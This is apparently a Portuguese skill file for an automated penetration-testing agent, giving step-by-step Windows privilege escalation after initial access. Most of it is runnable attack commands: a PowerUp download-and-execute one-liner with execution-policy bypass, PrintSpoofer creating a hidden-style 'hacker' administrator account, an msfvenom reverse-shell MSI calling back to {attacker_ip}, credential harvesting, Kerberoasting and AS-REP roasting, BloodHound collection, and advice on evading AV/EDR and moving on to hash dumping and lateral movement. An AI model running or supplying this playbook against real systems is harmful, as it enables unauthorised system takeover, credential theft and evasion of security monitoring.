---
name: windows_privilege_escalation
phase: 5_post_exploitation
tools: [winpeas, powerup, seatbelt, sharphound, rubeus]
dependencies: [initial_access_obtained]
mitre_tactic: TA0004 (Privilege Escalation)
---

# Objetivo
Escalar privilegios de um usuario comum para SYSTEM/Administrator em sistemas Windows, explorando token impersonation, SeImpersonate, unquoted service paths, DLL hijacking, AlwaysInstallElevated, Kerberoasting e outras misconfiguracoes.

# Condicoes de Execucao
- Acesso ao sistema Windows foi obtido (shell reversa, RDP, WinRM, etc.).
- O usuario atual NAO e SYSTEM nem Administrator.
- Ferramentas podem ser transferidas para o alvo ou executadas em memoria.

# Comandos e Sintaxe

## 1. WinPEAS - Enumeracao Automatizada
```bash
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o {workspace}/winpeas.exe
```

### Execucao no alvo
```powershell
.\winpeas.exe quiet servicesinfo applicationsinfo networkinfo usersinfo 2>&1 | tee {workspace}\winpeas_output.txt
```

## 2. Seatbelt - Enumeracao de Seguranca
```powershell
.\Seatbelt.exe -group=all -full 2>&1 | tee {workspace}\seatbelt_output.txt
```

### Checks especificos
```powershell
.\Seatbelt.exe TokenPrivileges InstalledProducts RegistryAutoRuns ScheduledTasks 2>&1 | tee {workspace}\seatbelt_specific.txt
```

## 3. PowerUp - Enumeracao de Privilege Escalation
```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks" 2>&1 | tee {workspace}\powerup_output.txt
```

## 4. Verificacoes Manuais

### Informacoes do Sistema
```powershell
systeminfo | tee {workspace}\systeminfo.txt
whoami /all | tee {workspace}\whoami_all.txt
whoami /priv | tee {workspace}\whoami_priv.txt
net user | tee {workspace}\net_users.txt
net localgroup administrators | tee {workspace}\local_admins.txt
```

### Token Impersonation - SeImpersonatePrivilege
```powershell
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken SeDebug"
```

#### Exploracao com PrintSpoofer
```powershell
.\PrintSpoofer64.exe -i -c "cmd /c whoami" 2>&1 | tee {workspace}\printspoofer_test.txt
.\PrintSpoofer64.exe -i -c "cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add" 2>&1 | tee {workspace}\printspoofer_exploit.txt
```

#### Exploracao com GodPotato
```powershell
.\GodPotato-NET4.exe -cmd "cmd /c whoami" 2>&1 | tee {workspace}\godpotato_test.txt
```

### Unquoted Service Paths
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows" | findstr /v /c:^" | tee {workspace}\unquoted_paths.txt
```

### Servicos com permissoes fracas
```powershell
accesschk64.exe -uwcqv "Everyone" * /accepteula 2>&1 | tee {workspace}\weak_services_everyone.txt
accesschk64.exe -uwcqv "Authenticated Users" * /accepteula 2>&1 | tee {workspace}\weak_services_auth.txt
accesschk64.exe -uwcqv "Users" * /accepteula 2>&1 | tee {workspace}\weak_services_users.txt
```

### DLL Hijacking - Diretorios com escrita
```powershell
icacls "C:\Program Files" /t /c 2>nul | findstr /i "(F) (M) (W) (CI)(OI)" | tee {workspace}\dll_hijack_paths.txt
```

### AlwaysInstallElevated
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>&1 | tee {workspace}\aie_hklm.txt
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>&1 | tee {workspace}\aie_hkcu.txt
```

#### Exploracao com msfvenom (se AlwaysInstallElevated ativo)
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={attacker_ip} LPORT=4444 -f msi -o {workspace}/exploit.msi
```
```powershell
msiexec /quiet /qn /i {workspace}\exploit.msi
```

### Credenciais Salvas
```powershell
cmdkey /list | tee {workspace}\saved_creds.txt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>&1 | tee {workspace}\autologon_creds.txt
dir /s /b C:\Users\*.txt C:\Users\*.ini C:\Users\*.xml 2>nul | findstr /i "pass config cred" | tee {workspace}\cred_files.txt
```

### Scheduled Tasks com permissoes fracas
```powershell
schtasks /query /fo TABLE /nh | tee {workspace}\scheduled_tasks.txt
```

### Registry Autoruns
```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 2>&1 | tee {workspace}\autoruns_hklm.txt
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 2>&1 | tee {workspace}\autoruns_hkcu.txt
```

## 5. Kerberoasting com Rubeus
```powershell
.\Rubeus.exe kerberoast /outfile:{workspace}\kerberoast_hashes.txt 2>&1 | tee {workspace}\rubeus_kerberoast.txt
```

### Kerberoasting com impacket (remoto)
```bash
impacket-GetUserSPNs {domain}/{username}:{password} -dc-ip {target_ip} -request -outputfile {workspace}/kerberoast_hashes.txt 2>&1 | tee {workspace}/kerberoast_impacket.txt
```

## 6. BloodHound - Enumeracao de Active Directory
```powershell
.\SharpHound.exe --CollectionMethods All --Domain {domain} --OutputDirectory {workspace}\ 2>&1 | tee {workspace}\sharphound_output.txt
```

### Coleta com BloodHound Python (remoto)
```bash
bloodhound-python -d {domain} -u {username} -p {password} -ns {target_ip} -c all --zip -o {workspace}/ 2>&1 | tee {workspace}/bloodhound_python.txt
```

## 7. AS-REP Roasting com Rubeus
```powershell
.\Rubeus.exe asreproast /outfile:{workspace}\asrep_hashes.txt 2>&1 | tee {workspace}\rubeus_asreproast.txt
```

# Analise de Resultados
- **SeImpersonatePrivilege habilitado:** Usar PrintSpoofer, GodPotato ou JuicyPotato para escalar para SYSTEM.
- **Unquoted service path encontrado:** Criar executavel malicioso no path intermediario e reiniciar o servico.
- **AlwaysInstallElevated = 1 em HKLM e HKCU:** Gerar MSI malicioso e executar como SYSTEM.
- **Servico com permissao de escrita:** Modificar o binPath do servico para payload e reiniciar.
- **Kerberoast hashes obtidos:** Enviar para `hash_dumping_and_cracking` para quebra offline.
- **SharpHound coletou dados:** Importar no BloodHound e buscar caminhos para Domain Admin.
- **Credenciais em autologon/registry:** Testar em outros servicos e maquinas.

# Proximos Passos
- Se obtiver SYSTEM/Admin, acione `hash_dumping_and_cracking` para extrair SAM/NTDS.
- Se encontrar credenciais de dominio, acione `lateral_movement_psexec`.
- Se BloodHound mostrar caminho para DA, seguir o attack path identificado.
- Documentar todos os vetores encontrados para o relatorio.

# Tratamento de Erros
- Se WinPEAS for bloqueado por AV/EDR, execute verificacoes manuais individualmente.
- Se PowerUp falhar com execution policy, use: `powershell -ep bypass`.
- Se Rubeus for detectado, tente impacket-GetUserSPNs remotamente.
- Se SharpHound for bloqueado, use bloodhound-python a partir da maquina atacante.
- Se ferramentas nao puderem ser transferidas, use LOLBins (Living Off the Land) nativos do Windows.
- Se PrintSpoofer falhar, tente GodPotato, JuicyPotato ou RoguePotato como alternativas.
